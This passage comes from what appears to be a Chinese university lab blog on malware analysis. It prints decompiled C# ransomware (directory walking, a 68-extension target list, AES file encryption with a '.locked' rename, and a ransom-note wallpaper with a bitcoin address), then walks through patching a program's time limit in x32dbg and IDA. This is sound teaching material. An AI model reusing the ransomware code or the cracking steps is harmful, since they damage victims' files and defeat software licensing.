= userDir + str + userName + <span class="hljs-string">&quot;\\Favorites&quot;</span>;<br><span class="hljs-number">14</span>     <span class="hljs-built_in">string</span> location12 = userDir + str + userName + <span class="hljs-string">&quot;\\Searches&quot;</span>;<br><span class="hljs-number">15</span>     <span class="hljs-built_in">string</span> location13 = userDir + str + userName + <span class="hljs-string">&quot;\\Videos&quot;</span>;<br><span class="hljs-number">16</span>     encryptDirectory(location, password);<br><span class="hljs-number">17</span>     encryptDirectory(location2, password);<br><span class="hljs-number">18</span>     encryptDirectory(location3, password);<br><span class="hljs-number">19</span>     encryptDirectory(location4, password);<br><span class="hljs-number">20</span>     encryptDirectory(location5, password);<br><span class="hljs-number">21</span>     encryptDirectory(location6, password);<br><span class="hljs-number">22</span>     encryptDirectory(location7, password);<br><span class="hljs-number">23</span>     encryptDirectory(location8, password);<br><span class="hljs-number">24</span>     encryptDirectory(location9, password);<br><span class="hljs-number">25</span>     encryptDirectory(location10, password);<br><span class="hljs-number">26</span>     encryptDirectory(location11, password);<br><span class="hljs-number">27</span>     encryptDirectory(location12, password);<br><span class="hljs-number">28</span>     encryptDirectory(location13, password);<br><span class="hljs-number">29</span> &#125;<br><br></code></pre></td></tr></table></figure><p>目录加密是在Directory_Settings_Sending方法中实现的，通过代码可以看出恶意代码主要是对用户的一些典型的资料保存的文件路径进行加密，例如桌面，图片文件夹，我的文档，音乐，视频等。具体加密的代码在encryptDirectory方法中实现。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">encryptDirectory</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> location, <span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-number">03</span>         <span class="hljs-built_in">string</span>[] source = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">68</span>] &#123;<br><span class="hljs-number">04</span><span class="hljs-string">&quot;.txt&quot;</span>,<span class="hljs-string">&quot;.jar&quot;</span>,<span class="hljs-string">&quot;.exe&quot;</span>,<span class="hljs-string">&quot;.dat&quot;</span>,<span class="hljs-string">&quot;.contact&quot;</span>,<span class="hljs-string">&quot;.settings&quot;</span>,<span class="hljs-string">&quot;.doc&quot;</span>,<span class="hljs-string">&quot;.docx&quot;</span>,<span class="hljs-string">&quot;.xls&quot;</span>,<span class="hljs-string">&quot;.xlsx&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<span class="hljs-string">&quot;.pptx&quot;</span>,<span class="hljs-string">&quot;.odt&quot;</span>,<span class="hljs-string">&quot;.jpg&quot;</span>,<span class="hljs-string">&quot;.png&quot;</span>,<span class="hljs-string">&quot;.csv&quot;</span>,<span class="hljs-string">&quot;.py&quot;</span>,<span class="hljs-string">&quot;.sql&quot;</span>,<span class="hljs-string">&quot;.mdb&quot;</span>,<span class="hljs-string">&quot;.sln&quot;</span>,<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.xml&quot;</span>,<span class="hljs-string">&quot;.psd&quot;</span>,<span class="hljs-string">&quot;.pdf&quot;</span>,<span class="hljs-string">&quot;.dll&quot;</span>,<span class="hljs-string">&quot;.c&quot;</span>,<span class="hljs-string">&quot;.cs&quot;</span>,<span class="hljs-string">&quot;.mp3&quot;</span>,<span class="hljs-string">&quot;.mp4&quot;</span>,<span class="hljs-string">&quot;.f3d&quot;</span>,<span class="hljs-string">&quot;.dwg&quot;</span>,<span class="hljs-string">&quot;.cpp&quot;</span>,<span class="hljs-string">&quot;.zip&quot;</span>,<span class="hljs-string">&quot;.rar&quot;</span>,<span class="hljs-string">&quot;.mov&quot;</span>,<span class="hljs-string">&quot;.rtf&quot;</span>,<span class="hljs-string">&quot;.bmp&quot;</span>,<span class="hljs-string">&quot;.mkv&quot;</span>,<span class="hljs-string">&quot;.avi&quot;</span>,<span class="hljs-string">&quot;.apk&quot;</span>,<span class="hljs-string">&quot;.lnk&quot;</span>,<span class="hljs-string">&quot;.iso&quot;</span>,<span class="hljs-string">&quot;.7-zip&quot;</span>,<span class="hljs-string">&quot;.ace&quot;</span>,<span class="hljs-string">&quot;.arj&quot;</span>,<span class="hljs-string">&quot;.bz2&quot;</span>,<span class="hljs-string">&quot;.cab&quot;</span>,<span class="hljs-string">&quot;.gzip&quot;</span>,<span class="hljs-string">&quot;.lzh&quot;</span>,<span class="hljs-string">&quot;.tar&quot;</span>,<span class="hljs-string">&quot;.uue&quot;</span>,<span class="hljs-string">&quot;.xz&quot;</span>,<span class="hljs-string">&quot;.z&quot;</span>,<span class="hljs-string">&quot;.001&quot;</span>,<span class="hljs-string">&quot;.mpeg&quot;</span>,<span class="hljs-string">&quot;.mp3&quot;</span>,<span class="hljs-string">&quot;.mpg&quot;</span>,<span class="hljs-string">&quot;.core&quot;</span>,<span class="hljs-string">&quot;.crproj&quot;</span>,<span class="hljs-string">&quot;.pdb&quot;</span>,<span class="hljs-string">&quot;.ico&quot;</span>,<span class="hljs-string">&quot;.pas&quot;</span>,<span class="hljs-string">&quot;.db&quot;</span>,<span class="hljs-string">&quot;.torrent&quot;</span><br><span class="hljs-number">05</span>         &#125;;<br><span class="hljs-number">06</span>         <span class="hljs-built_in">string</span>[] files = Directory.GetFiles(location);<br><span class="hljs-number">07</span>         <span class="hljs-built_in">string</span>[] directories = Directory.GetDirectories(location);<br><span class="hljs-number">08</span>         <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; files.Length; i++) &#123;<br><span class="hljs-number">09</span>             <span class="hljs-built_in">string</span> extension = Path.GetExtension(files[i]);<br><span class="hljs-number">10</span>             <span class="hljs-keyword">if</span> (source.Contains(extension)) &#123;<br><span class="hljs-number">11</span>                 EncryptFile(files[i], password);<br><span class="hljs-number">12</span>             &#125;<br><span class="hljs-number">13</span>         &#125;<br><span class="hljs-number">14</span>         <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; directories.Length; j++) &#123;<br><span class="hljs-number">15</span>             encryptDirectory(directories[j], password);<br><span class="hljs-number">16</span>         &#125;<br><span class="hljs-number">17</span>     &#125; <span class="hljs-keyword">catch</span> (Exception) &#123;<br><span class="hljs-number">18</span>     &#125;<br><span class="hljs-number">19</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上的代码中可以分析出，恶意代码仅对指定的文件类型进行加密，主要是各类文档，程序代码和数据文件。以上加密过程中，还调用了EncryptFile方法对文件加密，代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">EncryptFile</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> file, <span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-built_in">byte</span>[] bytesToBeEncrypted = File.ReadAllBytes(file);<br><span class="hljs-number">03</span>     <span class="hljs-built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(password);<br><span class="hljs-number">04</span>     bytes = SHA256.Create().ComputeHash(bytes);<br><span class="hljs-number">05</span>     <span class="hljs-built_in">byte</span>[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);<br><span class="hljs-number">06</span>     <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Users\\&quot;</span>;<br><span class="hljs-number">07</span>     <span class="hljs-built_in">string</span> str2 = str + userName + <span class="hljs-string">&quot;\\Desktop\\READ_IT.txt.locked&quot;</span>;<br><span class="hljs-number">08</span>     <span class="hljs-built_in">string</span> path = userDir + str2;<br><span class="hljs-number">09</span>     <span class="hljs-keyword">if</span> (File.Exists(path)) &#123;<br><span class="hljs-number">10</span>         File.Delete(path);<br><span class="hljs-number">11</span>     &#125;<br><span class="hljs-number">12</span>     File.WriteAllBytes(file, bytes2);<br><span class="hljs-number">13</span>     File.Move(file, file + <span class="hljs-string">&quot;.locked&quot;</span>);<br><span class="hljs-number">14</span> &#125;<br><br></code></pre></td></tr></table></figure><p>对以上的代码分析，可以发现恶意代码将文件进行加密，然后增加”.locked”文件名后缀。</p><p>这里请读者分析全部代码后解释其中6-11行代码意义是什么？特别是第10行代码是否会执行？</p><p>以上代码中，最终调用了AES_Encrypt方法对文件内容进行加密，这是典型的库函数调用加密过程代码，这里就不进行分析了。</p><h4 id="4-3-4-创建勒索信息"><a href="#4-3-4-创建勒索信息" class="headerlink" title="4.3.4 创建勒索信息"></a>4.3.4 创建勒索信息</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">CreateWallpaper</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> path</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-number">03</span>         <span class="hljs-built_in">string</span> text = Create(<span class="hljs-number">17</span>);<br><span class="hljs-number">04</span>         <span class="hljs-built_in">string</span> s = <span class="hljs-string">&quot;All your files are encrypted with RSA-2048 and AES-128 cipher&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;More information about RSA and AES can be found here:&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;https://en.wikipedia.org/wiki/RSA_(cryptosystem)&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&quot;</span> + Environment.NewLine + Environment.NewLine + <span class="hljs-string">&quot;In order to decrypt your files you need to follow these steps&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;1) buy bitcoins https://cex.io/buy-bitcoins&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;2) send 0.055 BTC to&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;32CCbV3wMs4kRo8vZ9GuusgzZh4D5GdkUo&quot;</span> + Environment.NewLine + <span class="hljs-string">&quot;3) Perform a payment&quot;</span> + Environment.NewLine + Environment.NewLine + <span class="hljs-string">&quot;Your personal identification ID: &quot;</span> + text;<br><span class="hljs-number">05</span>         Bitmap bitmap = <span class="hljs-keyword">new</span> Bitmap(pictureBox1.Width, pictureBox1.Height);<br><span class="hljs-number">06</span>         Font font = <span class="hljs-keyword">new</span> Font(<span class="hljs-string">&quot;TimesNewRoman&quot;</span>, <span class="hljs-number">25f</span>, FontStyle.Regular, GraphicsUnit.Pixel);<br><span class="hljs-number">07</span>         Graphics graphics = Graphics.FromImage(bitmap);<br><span class="hljs-number">08</span>         graphics.DrawString(s, font, Brushes.Tomato, <span class="hljs-keyword">new</span> Point(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>));<br><span class="hljs-number">09</span>         bitmap.Save(path);<br><span class="hljs-number">10</span>         SetWallpaper(path);<br><span class="hljs-number">11</span>     &#125; <span class="hljs-keyword">catch</span> (Exception) &#123;<br><span class="hljs-number">12</span>     &#125;<br><span class="hljs-number">13</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上代码分析可以得知其主要功能是构建勒索信息，将比特币转账地址，价格等信息制作成图片，然后设置为用户的桌面显示给用户。</p><p>至此，一个完成的勒索病毒的功能都分析完毕。由于是使用C#编写，且没有对代码进行混淆处理，直接使用逆向分析工具就能获得源码进行分析，相对比较的简单，并且从病毒作者的编码错误可以推断水平不高，制作较为粗糙。但整体作为一款勒索软件，具备了相关的基本要素。 </p><h2 id="5-实验结果："><a href="#5-实验结果：" class="headerlink" title="5. 实验结果："></a>5. 实验结果：</h2><ol><li><p>请简要说明恶意代码的主要执行流程。</p></li><li><p>请指出恶意代码破坏的用户目录文件位置，破坏文件类型？</p></li><li><p>请指出恶意代码是如何发送用户密码等信息的？其目的是什么？</p></li><li><p>其他实验问题及结论：</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制程序补丁实验——修改软件时间限制</title>
    <link href="/2024/10/24/111/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E8%A1%A5%E4%B8%81%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E4%BF%AE%E6%94%B9%E8%BD%AF%E4%BB%B6%E6%97%B6%E9%97%B4%E9%99%90%E5%88%B6/"/>
    <url>/2024/10/24/111/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E8%A1%A5%E4%B8%81%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E4%BF%AE%E6%94%B9%E8%BD%AF%E4%BB%B6%E6%97%B6%E9%97%B4%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="1-实验概述"><a href="#1-实验概述" class="headerlink" title="1. 实验概述"></a>1. 实验概述</h2><p>​        在“ESP定律脱壳实验“中，脱壳后的DiskProbe_dump_SCY.exe程序就可以进入下一步的分析工作，为了模拟恶意代码分析训练，本实验要求使用动态分析的方法，分析已经脱壳后的DiskProbe_dump_SCY.exe，找到其时间限制的代码，并进行代码修补，最终得到一个破解时间限制的DiskProbe软件。</p><h3 id="1-1-实验软件"><a href="#1-1-实验软件" class="headerlink" title="1.1 实验软件"></a>1.1 实验软件</h3><ul><li>x32dbg  【<a href="http://172.17.200.225/gyf/Malware/x96dbg.zip%E3%80%91">http://172.17.200.225/gyf/Malware/x96dbg.zip】</a></li><li>Ida Pro （软件在教学电脑上已经安装）【<a href="http://172.17.200.225/gyf/Malware/IDAPro.zip%E3%80%91">http://172.17.200.225/gyf/Malware/IDAPro.zip】</a></li><li>DiskProbe.exe 【<a href="http://172.17.200.225/gyf/Malware/DiskProbe.exe%E3%80%91">http://172.17.200.225/gyf/Malware/DiskProbe.exe】</a></li></ul><h3 id="1-2-实验目标"><a href="#1-2-实验目标" class="headerlink" title="1.2  实验目标"></a>1.2  实验目标</h3><ul><li>掌握动态分析工具x32dbg的使用</li><li>掌握静态分析工具ida pro的使用</li><li>了解Windows应用程序文件逆向操作流程</li></ul><h2 id="2-实验原理及方法"><a href="#2-实验原理及方法" class="headerlink" title="2. 实验原理及方法"></a>2. 实验原理及方法</h2><p><img src="http://wxjb.jspi.cn/g/query/b3bcda5c-59b5-4ae0-8cc7-0d0e2707887d" alt="程序执行时间限制"></p><center>图1 DiskProbe提示框</center><p><strong>实验思路：</strong></p><p>​        DiskPro软件在启动后会显示更新提示对话框，如图1，表明程序在启动后会自动版本检测。如果能够在代码中定位检测代码的位置，就可以实现对这个时间限制的修改。</p><p>​         版本的检测有多种方式，比较简单的方式是检测发布时间和用户当前电脑时间的差值，当时间差超过特定值就认为版本过期。这是早期的一些软件常用的检测方法，因为其实现简单，现在还有很多软件采用这种方式。这里首先假设是采用的这种时间检测法，然后展开对应的分析和破解流程。（实际分析后发现diskprobe确实使用了简单的时间检测）。</p><p>​        因为时间检测法必须要获得当前系统的时间，所以必定会调用读取当前系统时间的API函数，通过查阅Window API，常见的获取系统时间的API是GetSystemTime函数。以下是函数原型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GetSystemTime</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [out] LPSYSTEMTIME lpSystemTime</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>​         按照这个假设，使用动态调试的方式，在调试器添加API函数断点，然后启动调试，调试代码在访问的API函数的地址时，断点会被触发，此时就能找到函数被调用的代码位置。</p><p><strong>注意：</strong></p><p>​        实验软件提供的diskpro.exe是未脱壳版本软件，请按照”使用ESP定律脱壳实验“中的方法首先将软件脱壳，得到脱壳后的软件，DiskProbe_dump_SCY.exe，再进行以下实验。</p><p>​        以下分别使用x32dbg和Ida Pro两款软件进行实验。</p><h3 id="2-1-使用x32dbg动态分析实验"><a href="#2-1-使用x32dbg动态分析实验" class="headerlink" title="2.1 使用x32dbg动态分析实验"></a>2.1 使用x32dbg动态分析实验</h3><h4 id="2-1-1-添加断点"><a href="#2-1-1-添加断点" class="headerlink" title="2.1.1 添加断点"></a>2.1.1 添加断点</h4><ul><li>使用x32dbg打开脱壳后的软件 DiskProbe_dump_SCY.exe</li></ul><p><img src="http://wxjb.jspi.cn/g/query/54c5db37-874d-4708-8f65-c82561fe669b" alt="GetSystemTime"></p><center>图2 查找GetSystemTime API</center><ul><li><p>在x32dbg中切换到”符号“标签页面，并选择DiskProbe_dump_SCY.exe模块，然后在右侧搜索中输入<code>GetSystemTime</code>。如图2中，输入”Get“字符后就已经筛出所需的API函数了，不一定需要输入全部的函数名称。</p></li><li><p>单击右键GetSystemTime，然后单击”切换断点“菜单项添加断点（选择GetSystemTime项后，使用<code>F2</code>快捷键也可以添加断点）。添加断点后，可以点击”断点“标签页查看是否添加成功。</p><blockquote><p>以上查找GetSystemTime的过程可以直接使用命令而不需要进行前面两部的操作。对于熟练使用了x32dbg，推荐使用命令添加断点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在调试器底端的命令输入框输入命令添加访问GetSystemTime函数的断点</span><br>bp GetSystemTime<br></code></pre></td></tr></table></figure></blockquote></li><li><p>断点添加完毕后，可以打开“断点”子页面查看是否正确添加断点，另外开启调试器后会自动添加一些断点，可以把这些断点删除。</p></li></ul><h4 id="2-1-2-分析断点代码"><a href="#2-1-2-分析断点代码" class="headerlink" title="2.1.2 分析断点代码"></a>2.1.2 分析断点代码</h4><ul><li>在上一小节中正确添加断点后，可以使用<code>F9</code>快捷键启动调试。</li></ul><p><img src="http://wxjb.jspi.cn/g/query/3705b203-05e8-4b67-a2ae-ba3d8b210191" alt="GetSystemTime BreakPoint Stop"></p><center>图3 GetSystemTime断点</center><p>​        在图3中EIP指向地址为75E72300，为系统动态链接库的载入地址，此时调试器中断在GetSystemTime函数内部，但实验需要分析得到的是调用GetSystemTime函数的<strong>用户代码</strong>的位置，也就是调用GetSystemTime这个函数的代码段。找到位置可以有以下两种方法，同学们可以都尝试一下。</p><p>​        （1）利用函数调用栈帧的内存结构布局，可以查看当前栈顶数据，这个数据地址就是调用GetSystemTime函数后面下一条指令地址，就是实验所需要定位的用户代码段。通过<strong>右键单击栈顶地址</strong>，在弹出的菜单中选择“在反汇编中转到指定DWORD”，如图4，就能进入GetSystemTime函数被调用后下一条指令的地址。</p><p><img src="http://wxjb.jspi.cn/g/query/99ae7b55-f481-48bb-9ae7-c8b59c4bbe1b" alt="GetSystemTime调用地址"></p><center>图4 跳转到函数调用位置</center><p>​        （2）利用调试器的<em>运行到用户代码</em>功能，执行代码到GetSystemTime函数后的指令位置。事实上调试器中断的位置是GetSystemTime函数开头代码，但GetSystemTime是系统函数代码，属于系统地址空间，这时使用快捷键<code>Alt+F9</code>（<em>运行到用户代码</em>功能）就能快速执行GetSystemTime函数代码，暂停在用户代码位置，即GetSystemTime调用后的位置。</p><p><img src="http://wxjb.jspi.cn/g/query/a80ba0b7-5370-4f9d-b61e-95a0dd9b4e77" alt="GetSystemTime调用下一条指令"></p><center>图5 GetSystemTime调用代码位置</center><p>​        使用以上两种方法都能正确的导航到GetSystemTime被调用的位置下一条指令，滚动上翻几行指令，就能看到如图5所示的完整调用代码。</p><ul><li>代码功能分析</li></ul><p>​        找到调用函数位置后，需要阅读调用后的相关代码，按照推测思路，查找对时间比较的代码。</p><p>​        在汇编指令代码中，常见的比较都会使用<code>cmp</code>指令进行比较操作，在比较操作后，会使用各类<strong>条件跳转指令</strong>进行分支操作，常见的<strong>条件跳转指令</strong>有<code>jg,jle,jb,je,jz,……</code></p><img src="http://wxjb.jspi.cn/g/query/c584c92c-d7ce-4dfa-b48e-144d55374699" alt="比较时间用户代码" style="zoom: 67%;" /><center>图6 时间比较指令</center><p>​        查看在GetSystemTime函数调用后代码段，如图6所示。其中有一条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">00435471  | 6A 00       | push 0                              |<br>00435473  | FF15 A0B644 | call dword ptr ds:[&lt;&amp;exit&gt;]         |  &lt;= 退出程序<br></code></pre></td></tr></table></figure><p>​        这与软件在运行后，弹出升级对话框后，点击确定就退出程序的行为一致。所以主要分析GetSystemTime和这条指令之间的代码。</p><p>​        地址0x00435431是在获取到当前系统时间后的一次比较，然后下一条指令按照比较结果，可以跳转到地址0x00435463，而这个地址向下执行就到达了退出程序的代码段，因此这里可以将0x00435433地址处的比较跳转进行逻辑上的相反，那么程序就不会退出了。按照这个思路可以做如下操作：</p><p>具体步骤：</p><p>（1）单击图6中地址为 00435433指令，使其被选中状态。</p><p>（2）单击空格键，在汇编窗口中，将原有的<code>jg</code>指令替换成<code>jle</code>，其他不变。（这里也可以用NOP填充代码进行修改）</p><p>（3）单击快捷键<code>F9</code>,继续调试运行程序代码。</p><p>完成以上3步操作后，发现diskprobe程序主界面已经正常显示，且没有了原来的时间对话框，修改代码有效。</p><blockquote><p>以上指令修改中，<code>jg</code>和<code>jle</code>分别是“大于跳转”和“小于等于跳转”两种相反逻辑的跳转指令，因此当修改指令后，程序不再弹出时间对话框，软件正常运行全部功能。</p><p>以上的步骤是经过整理优化的分析过程，实际的分析过程中需要多次的尝试，除了阅读代码，还需要经历大量的失败才能找到最终的结果，所以实际工作不会如实验这样顺利完成。</p></blockquote><h4 id="2-1-3-补丁文件"><a href="#2-1-3-补丁文件" class="headerlink" title="2.1.3 补丁文件"></a>2.1.3 补丁文件</h4><p>当以上动态调试成功后，可以使用x32dbg的补丁功能，将内存中已经修改好的程序保存在磁盘上。</p><p><img src="http://wxjb.jspi.cn/g/query/7fc59cbb-996d-4a82-b169-11ec101c8eca" alt="补丁时间条状逻辑"></p><center>图7 补丁修改文件</center><ul><li>单击工具栏上补丁按钮或使用快捷键<code>Ctrl+P</code>,打开图7对话框。</li><li>单击“修补文件”完成补丁修改。</li><li>测试：打开修补后的可执行程序文件。</li></ul><h3 id="2-2-使用Ida-pro静态分析实验"><a href="#2-2-使用Ida-pro静态分析实验" class="headerlink" title="2.2 使用Ida pro静态分析实验"></a>2.2 使用Ida pro静态分析实验</h3><p>​        Ida Pro是典型的恶意代码静态分析工具，可以将各类二进制执行文件逆向出汇编指令，甚至是类C语言的伪代码，极大的提高了逆向分析效率，其中自动对函数的识别，标识变量的自动标注非常的方便。本节实验利用其静态分析功能，分析关键代码并使用补丁功能最终完成对目标软件的功能破解。</p><h4 id="2-2-1-查找GetSystemTime函数调用代码"><a href="#2-2-1-查找GetSystemTime函数调用代码" class="headerlink" title="2.2.1 查找GetSystemTime函数调用代码"></a>2.2.1 查找GetSystemTime函数调用代码</h4><ul><li>查找GetSystemTime函数调用内存地址</li></ul><p><img src="http://wxjb.jspi.cn/g/query/daf8297e-b4e5-4c04-a560-4d4d74bec414" alt="idapro_import"></p><center>图8 查找导入函数</center><p>​        IDA Pro的Import子视图能够显示程序导入的外部函数，GetSystemTime是系统kernel32.dll中的函数，因此可以从这里查看到导入的内存地址。默认启动IDA Pro就会自动在主界面中显示Imports页面，如果没有显示，可以在菜单中打开，菜单路径为：<code>View-&gt;Open subviews-&gt;imports</code>。</p><p>​        在Imports视图中会显示大量的导入函数，为了方便查找，可以输入查找函数的前几个符号筛选。查找到GetSystemTime函数的内存地址为0044B04C，记录这个地址。</p><ul><li><p>定位GetSystemTime函数内存</p><p>在图8界面中切换显示反汇编视图，即IDA-View-A页面，然后单击快捷键<code>g</code>,然后输入记录的GetSystemTime内存地址，就能在在反汇编窗口显示GetSystemTime函数，如图9。</p></li></ul><p><img src="http://wxjb.jspi.cn/g/query/3784d175-09a7-4b95-90c7-d6e05cba822d" alt="GetSystemTimeAddress"></p><center>图9 GetSystemTime函数</center><ul><li>定位GetSystemTime函数调用位置</li></ul><p>​        在图9界面中，在单击GetSystemTime，然后使用快捷键<code>x</code>,打开交叉引用列表，如图10，在这个列表中，列出了GetSystemTime被调用的位置，选择其中项目单击OK就能定位到对应的函数调用的位置。</p><p><img src="http://wxjb.jspi.cn/g/query/9de5f6cc-0fee-4e4a-bbc1-7b1fca7dfc4c" alt="函数引用"></p><center>图10 查找引用GetSystemTime的引用</center><p>​        这里只有一处引用了GetSystemTime代码，打开后就能显示函数调用处的反汇编，如图11。</p><p><img src="http://wxjb.jspi.cn/g/query/609f6962-d462-4bc1-9607-1e3920601371" alt="调用GetSystemTime位置代码"></p><center>图11 GetSystemTime调用的用户代码段</center><h4 id="2-2-2-分析代码并制作补丁文件"><a href="#2-2-2-分析代码并制作补丁文件" class="headerlink" title="2.2.2 分析代码并制作补丁文件"></a>2.2.2 分析代码并制作补丁文件</h4><ul><li>代码分析</li></ul><p>在图11中，能直观的看到GetSystemTime调用后有两条红色的虚线箭头，这表示有两处进行了条件指令跳转，特别是顺着第一个跳转，可以看到是调用AfxMessageBox函数。</p><blockquote><p>AfxMessageBox是使用Visual C++的MFC开发框架中的个显示对话框的函数，由于这是一个C++函数，所以在编译后函数名会有些变化，看上去会增加一些杂乱的符号。IDA Pro软件识别了这个函数，并且在右侧使用灰色文字注释了这个函数的调用原型。</p></blockquote><p>通过查看AfxMessageBox函数的调用原型，可以发现其调的第一个参数是char const*，也就是输入的是字符串，联系前面的代码，可以确定是call指令上一条的push代码中引用的参数，offset unk_46C6D0就是这个参数字符串。IDA Pro中，如果确定所数据是字符串数据，可以使用快捷键<code>a</code>对二进制的数据进行转换。</p><p>（1）双击offset offset unk_46C6D0后，在窗口打开其对应的数据。</p><p>（2）在显示的窗口中，单击<code>a</code>键，此时会自动对数据进行字串解析，转换后显示如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">:0046C6CF                 align 10h<br>UPX0:0046C6D0 aBghuangSinaCom db &#x27;对不起，到期该升级了。(bghuang@sina.com)&#x27;,0<br>UPX0:0046C6D0                                         ; DATA XREF: UPX0:00435467↑o<br></code></pre></td></tr></table></figure><p>（3）单击键盘左上角<code>ESC</code>键，退出，此时发现此时反汇编代码更新了标识和备注，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">UPX0:00435463       push    0<br>UPX0:00435465       push    0<br>UPX0:00435467       push    offset aBghuangSinaCom ; &quot;对不起，到期该升级了。(bghuang@sina.com)&quot;<br>UPX0:0043546C       call    j_?AfxMessageBox@@YGHPBDII@Z ; AfxMessageBox(char const *,uint,uint)<br>UPX0:00435471       push    0<br>UPX0:00435473       call    exit<br></code></pre></td></tr></table></figure><p>到此已经能确认这里代码就是程序中弹出对话框的代码位置，图1显示的对话框，就是以上代码的执行效果。再参考图11中的代码，可以确认代码中第一个条件跳转指令是去除对话框的关键。</p><ul><li>补丁制作</li></ul><p>（1）单击选择地址00435433，使用菜单 <code>Edit -&gt; Patch Program -&gt; Assemble... </code>打开反汇编窗口，将原来jg指令修改为jle指令。</p><p>（2）使用菜单命令<code>Edit -&gt; Patch Program -&gt; Apply patches to input file... </code>，打开补丁文件对话框。单击确定，就能将原来的文件进行补丁。如果需要备份补丁前文件，可以勾选backup选项。</p><h4 id="2-2-3-测试"><a href="#2-2-3-测试" class="headerlink" title="2.2.3 测试"></a>2.2.3 测试</h4><p>​        直接打开补丁后的文件，发现已经去除了对话框，说明修改有效。</p><h2 id="3-实验结论"><a href="#3-实验结论" class="headerlink" title="3. 实验结论"></a>3. 实验结论</h2><ul><li>使用动态分析软件的行文相对比较简单，因此可以通过对比参考软件运行效果，查看运行数据，以及使用断点来提高对关键代码的定位。</li><li>使用静态分析需要更高的技术知识储备，需要非常熟悉分析的代码相关知识，例如对Windows 